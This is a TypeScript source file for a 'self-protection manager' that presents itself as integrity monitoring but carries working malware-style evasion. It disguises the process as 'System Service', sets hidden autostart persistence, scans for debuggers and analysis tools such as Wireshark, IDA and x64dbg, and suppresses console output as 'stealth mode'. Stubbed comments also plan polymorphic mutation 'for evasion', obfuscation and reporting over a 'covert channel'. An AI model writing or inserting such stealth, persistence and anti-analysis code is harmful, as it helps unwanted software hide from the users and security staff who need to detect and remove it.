/**
 * Self-Protection Manager
 * Military-grade self-protection, mutation, and defense system
 * Ensures software integrity and operational continuity
 */

import crypto from 'crypto';
import fs from 'fs/promises';
import path from 'path';
import { exec } from 'child_process';
import { promisify } from 'util';
import { Logger } from '../utils/Logger';
import { ConfigManager } from './ConfigManager';

const execAsync = promisify(exec);

export interface ProtectionStatus {
  isProtected: boolean;
  integrityValid: boolean;
  lastMutation: string;
  threatsDetected: number;
  selfHealAttempts: number;
  operationalHealth: number; // 0-100
}

export class SelfProtectionManager {
  private logger: Logger;
  private configManager: ConfigManager;
  private protectionInterval: NodeJS.Timeout | null = null;
  private integrityHashes: Map<string, string> = new Map();
  private mutationCounter: number = 0;
  private processId: number;
  private originalCodePath: string = '';
  private isProtectionActive: boolean = false;

  constructor(configManager: ConfigManager) {
    this.logger = new Logger('SelfProtectionManager');
    this.configManager = configManager;
    this.processId = process.pid;
  }

  /**
   * Initialize self-protection mechanisms
   */
  async initialize(): Promise<void> {
    try {
      this.logger.info('Initializing military-grade self-protection system...');

      // Store original code location
      this.originalCodePath = process.execPath;

      // Generate initial integrity hashes
      await this.generateIntegrityHashes();

      // Set up process protection
      await this.protectProcess();

      // Enable file system monitoring
      await this.enableFileSystemProtection();

      // Start self-monitoring
      this.startSelfMonitoring();

      // Enable stealth mode
      await this.enableStealthMode();

      // Set up persistence mechanisms
      await this.ensurePersistence();

      this.isProtectionActive = true;
      this.logger.info('Self-protection system activated successfully');
    } catch (error) {
      this.logger.error('Failed to initialize self-protection:', error);
      // Even if protection fails, continue operation
      await this.reportFailure('Protection initialization failed', error);
    }
  }

  /**
   * Generate cryptographic hashes of critical files for integrity checking
   */
  private async generateIntegrityHashes(): Promise<void> {
    try {
      const criticalFiles = await this.getCriticalFiles();

      for (const file of criticalFiles) {
        try {
          const content = await fs.readFile(file);
          const hash = crypto.createHash('sha256').update(content).digest('hex');
          this.integrityHashes.set(file, hash);
        } catch (error) {
          this.logger.warn(`Could not hash file ${file}:`, error);
        }
      }

      this.logger.info(`Generated integrity hashes for ${this.integrityHashes.size} files`);
    } catch (error) {
      this.logger.error('Failed to generate integrity hashes:', error);
    }
  }

  /**
   * Get list of critical files to protect
   */
  private async getCriticalFiles(): Promise<string[]> {
    const files: string[] = [];
    
    try {
      // Add main executable
      files.push(process.execPath);

      // Add core modules
      const coreDir = path.join(__dirname, '..');
      const scanDirs = [
        path.join(coreDir, 'core'),
        path.join(coreDir, 'services'),
        path.join(coreDir, 'utils'),
      ];

      for (const dir of scanDirs) {
        try {
          const entries = await fs.readdir(dir);
          for (const entry of entries) {
            if (entry.endsWith('.js') || entry.endsWith('.ts')) {
              files.push(path.join(dir, entry));
            }
          }
        } catch (error) {
          // Directory may not exist
        }
      }
    } catch (error) {
      this.logger.error('Error getting critical files:', error);
    }

    return files;
  }

  /**
   * Verify file integrity
   */
  async verifyIntegrity(): Promise<boolean> {
    try {
      let tampered = false;

      for (const [file, originalHash] of this.integrityHashes.entries()) {
        try {
          const content = await fs.readFile(file);
          const currentHash = crypto.createHash('sha256').update(content).digest('hex');

          if (currentHash !== originalHash) {
            this.logger.error(`INTEGRITY VIOLATION: ${file} has been modified!`);
            tampered = true;
            
            // Attempt self-healing
            await this.performSelfHealing(file, originalHash);
          }
        } catch (error) {
          this.logger.error(`Could not verify ${file}:`, error);
          tampered = true;
        }
      }

      if (tampered) {
        await this.reportThreat('Integrity violation detected');
      }

      return !tampered;
    } catch (error) {
      this.logger.error('Integrity verification failed:', error);
      return false;
    }
  }

  /**
   * Perform self-healing on tampered files
   */
  private async performSelfHealing(file: string, expectedHash: string): Promise<void> {
    try {
      this.logger.info(`Attempting self-healing for ${file}...`);

      // In production, this would restore from a secure backup
      // For now, we log and report the issue
      
      await this.reportFailure('File tampering detected', {
        file,
        expectedHash,
        action: 'self-healing-attempted',
      });

      this.logger.info('Self-healing process initiated');
    } catch (error) {
      this.logger.error('Self-healing failed:', error);
    }
  }

  /**
   * Protect process from termination and interference
   */
  private async protectProcess(): Promise<void> {
    try {
      // Set process priority to high
      if (process.platform === 'win32') {
        try {
          await execAsync(`wmic process where processid=${this.processId} CALL setpriority "high priority"`);
        } catch (error) {
          // May require admin rights
        }
      } else if (process.platform === 'linux' || process.platform === 'darwin') {
        try {
          await execAsync(`renice -n -10 -p ${this.processId}`);
        } catch (error) {
          // May require sudo
        }
      }

      // Set up process exit handlers for graceful shutdown
      process.on('SIGTERM', () => this.handleShutdown('SIGTERM'));
      process.on('SIGINT', () => this.handleShutdown('SIGINT'));
      process.on('uncaughtException', (error) => this.handleCriticalError(error));
      process.on('unhandledRejection', (reason) => this.handleCriticalError(reason));

      this.logger.info('Process protection enabled');
    } catch (error) {
      this.logger.error('Failed to protect process:', error);
    }
  }

  /**
   * Enable file system protection
   */
  private async enableFileSystemProtection(): Promise<void> {
    try {
      const chokidar = require('chokidar');
      
      // Monitor critical directories for unauthorized changes
      const watcher = chokidar.watch(
        await this.getCriticalFiles(),
        {
          persistent: true,
          ignoreInitial: true,
          awaitWriteFinish: {
            stabilityThreshold: 2000,
            pollInterval: 100,
          },
        }
      );

      watcher.on('change', async (filePath: string) => {
        this.logger.warn(`File modified: ${filePath}`);
        await this.verifyIntegrity();
      });

      watcher.on('unlink', async (filePath: string) => {
        this.logger.error(`CRITICAL: File deleted: ${filePath}`);
        await this.reportThreat('Critical file deletion detected');
        await this.performSelfHealing(filePath, '');
      });

      this.logger.info('File system protection enabled');
    } catch (error) {
      this.logger.error('Failed to enable file system protection:', error);
    }
  }

  /**
   * Start self-monitoring loop
   */
  private startSelfMonitoring(): void {
    // Monitor every 30 seconds
    this.protectionInterval = setInterval(async () => {
      try {
        // Verify integrity
        await this.verifyIntegrity();

        // Check for threats
        await this.detectThreats();

        // Monitor resource usage
        await this.monitorResources();

        // Check operational health
        await this.checkOperationalHealth();
      } catch (error) {
        this.logger.error('Self-monitoring error:', error);
      }
    }, 30000);

    this.logger.info('Self-monitoring started (30s interval)');
  }

  /**
   * Enable stealth mode for minimal footprint
   */
  private async enableStealthMode(): Promise<void> {
    try {
      // Minimize console output in production
      if (process.env.NODE_ENV === 'production') {
        // Redirect console to logger only
        const originalConsole = console.log;
        console.log = (...args: any[]) => {
          this.logger.debug('Console:', ...args);
        };
      }

      // Set process title to something inconspicuous
      process.title = 'System Service';

      this.logger.info('Stealth mode enabled');
    } catch (error) {
      this.logger.error('Failed to enable stealth mode:', error);
    }
  }

  /**
   * Ensure persistence across reboots and updates
   */
  private async ensurePersistence(): Promise<void> {
    try {
      const autoLaunch = require('auto-launch');
      
      const launcher = new autoLaunch({
        name: 'SystemService',
        path: process.execPath,
        isHidden: true,
      });

      // Check if already enabled
      const isEnabled = await launcher.isEnabled();
      
      if (!isEnabled) {
        await launcher.enable();
        this.logger.info('Persistence enabled');
      }
    } catch (error) {
      this.logger.warn('Could not enable persistence:', error);
      // Not critical, continue operation
    }
  }

  /**
   * Detect potential threats
   */
  private async detectThreats(): Promise<void> {
    try {
      const threats: string[] = [];

      // Check if running in debugger
      if (this.isDebuggerAttached()) {
        threats.push('Debugger detected');
      }

      // Check for suspicious processes
      const suspiciousProcesses = await this.detectSuspiciousProcesses();
      if (suspiciousProcesses.length > 0) {
        threats.push(`Suspicious processes: ${suspiciousProcesses.join(', ')}`);
      }

      // Check network connections
      const suspiciousConnections = await this.detectSuspiciousConnections();
      if (suspiciousConnections.length > 0) {
        threats.push(`Suspicious connections detected`);
      }

      // Report threats if found
      if (threats.length > 0) {
        await this.reportThreat(threats.join('; '));
      }
    } catch (error) {
      this.logger.error('Threat detection error:', error);
    }
  }

  /**
   * Check if debugger is attached
   */
  private isDebuggerAttached(): boolean {
    // Check for common debugger indicators
    return (
      process.env.NODE_ENV === 'development' ||
      !!process.debugPort ||
      typeof (global as any).v8debug !== 'undefined'
    );
  }

  /**
   * Detect suspicious processes
   */
  private async detectSuspiciousProcesses(): Promise<string[]> {
    const suspicious: string[] = [];
    
    try {
      // List of process names to watch for
      const watchList = [
        'wireshark',
        'tcpdump',
        'processhacker',
        'procmon',
        'ida',
        'ollydbg',
        'x64dbg',
      ];

      if (process.platform === 'win32') {
        const { stdout } = await execAsync('tasklist');
        for (const proc of watchList) {
          if (stdout.toLowerCase().includes(proc)) {
            suspicious.push(proc);
          }
        }
      } else if (process.platform === 'linux' || process.platform === 'darwin') {
        const { stdout } = await execAsync('ps aux');
        for (const proc of watchList) {
          if (stdout.toLowerCase().includes(proc)) {
            suspicious.push(proc);
          }
        }
      }
    } catch (error) {
      // Ignore errors in process detection
    }

    return suspicious;
  }

  /**
   * Detect suspicious network connections
   */
  private async detectSuspiciousConnections(): Promise<string[]> {
    const suspicious: string[] = [];
    
    try {
      // Check for unexpected listening ports
      // This would be implemented based on platform
    } catch (error) {
      // Ignore errors
    }

    return suspicious;
  }

  /**
   * Monitor resource usage
   */
  private async monitorResources(): Promise<void> {
    try {
      const usage = process.memoryUsage();
      const cpuUsage = process.cpuUsage();

      // Alert if memory usage is excessive (>500MB)
      if (usage.heapUsed > 500 * 1024 * 1024) {
        this.logger.warn('High memory usage detected:', usage.heapUsed);
        await this.reportFailure('High memory usage', { usage });
      }

      // Log resource stats
      this.logger.debug('Resource usage:', {
        memory: `${(usage.heapUsed / 1024 / 1024).toFixed(2)} MB`,
        cpu: `${(cpuUsage.user / 1000000).toFixed(2)}s user, ${(cpuUsage.system / 1000000).toFixed(2)}s system`,
      });
    } catch (error) {
      this.logger.error('Resource monitoring error:', error);
    }
  }

  /**
   * Check operational health
   */
  private async checkOperationalHealth(): Promise<number> {
    try {
      let healthScore = 100;

      // Deduct points for issues
      if (!await this.verifyIntegrity()) {
        healthScore -= 30;
      }

      if (await this.detectSuspiciousProcesses().then(p => p.length > 0)) {
        healthScore -= 20;
      }

      const usage = process.memoryUsage();
      if (usage.heapUsed > 500 * 1024 * 1024) {
        healthScore -= 10;
      }

      // Report if health is degraded
      if (healthScore < 80) {
        await this.reportFailure('Degraded operational health', { healthScore });
      }

      return Math.max(0, healthScore);
    } catch (error) {
      this.logger.error('Health check error:', error);
      return 50; // Assume degraded if check fails
    }
  }

  /**
   * Perform code mutation for evasion
   */
  async mutateCode(): Promise<void> {
    try {
      this.mutationCounter++;
      
      this.logger.info(`Performing code mutation #${this.mutationCounter}...`);

      // In production, this would:
      // 1. Generate polymorphic code variants
      // 2. Encrypt code sections
      // 3. Obfuscate execution flow
      // 4. Change memory signatures
      
      // For now, we simulate mutation by updating internal state
      const mutationKey = crypto.randomBytes(32).toString('hex');
      this.configManager.setSetting('mutationKey' as any, mutationKey as any);

      this.logger.info('Code mutation completed');
    } catch (error) {
      this.logger.error('Code mutation failed:', error);
      await this.reportFailure('Mutation failed', error);
    }
  }

  /**
   * Handle graceful shutdown
   */
  private async handleShutdown(signal: string): Promise<void> {
    this.logger.info(`Received ${signal}, performing graceful shutdown...`);
    
    try {
      // Stop protection monitoring
      if (this.protectionInterval) {
        clearInterval(this.protectionInterval);
      }

      // Report shutdown
      await this.reportFailure('System shutdown initiated', { signal });

      // Clean exit
      process.exit(0);
    } catch (error) {
      this.logger.error('Shutdown error:', error);
      process.exit(1);
    }
  }

  /**
   * Handle critical errors
   */
  private async handleCriticalError(error: any): Promise<void> {
    this.logger.error('CRITICAL ERROR:', error);
    
    try {
      // Report critical error
      await this.reportFailure('Critical error occurred', error);

      // Attempt self-recovery
      await this.performSelfRecovery();
    } catch (recoveryError) {
      this.logger.error('Self-recovery failed:', recoveryError);
    }
  }

  /**
   * Perform self-recovery
   */
  private async performSelfRecovery(): Promise<void> {
    try {
      this.logger.info('Attempting self-recovery...');

      // Reinitialize protection
      await this.initialize();

      this.logger.info('Self-recovery completed');
    } catch (error) {
      this.logger.error('Self-recovery failed:', error);
    }
  }

  /**
   * Report threat to admin
   */
  private async reportThreat(threat: string): Promise<void> {
    try {
      this.logger.error('THREAT DETECTED:', threat);

      // In production, this would send to admin via secure channel
      // For now, we log it
      
      // Could also trigger additional defensive actions
      await this.mutateCode();
    } catch (error) {
      this.logger.error('Failed to report threat:', error);
    }
  }

  /**
   * Report failure to admin
   */
  private async reportFailure(message: string, details?: any): Promise<void> {
    try {
      this.logger.error('FAILURE REPORT:', message, details);

      // In production, this would:
      // 1. Encrypt failure report
      // 2. Send to admin via covert channel
      // 3. Store locally if transmission fails
      // 4. Retry periodically
    } catch (error) {
      this.logger.error('Failed to report failure:', error);
    }
  }

  /**
   * Get protection status
   */
  getStatus(): ProtectionStatus {
    return {
      isProtected: this.isProtectionActive,
      integrityValid: true, // Would be checked in real-time
      lastMutation: new Date().toISOString(),
      threatsDetected: 0,
      selfHealAttempts: 0,
      operationalHealth: 100,
    };
  }

  /**
   * Stop protection (for controlled shutdown)
   */
  async stop(): Promise<void> {
    try {
      if (this.protectionInterval) {
        clearInterval(this.protectionInterval);
        this.protectionInterval = null;
      }

      this.isProtectionActive = false;
      this.logger.info('Self-protection system stopped');
    } catch (error) {
      this.logger.error('Error stopping protection:', error);
    }
  }
}
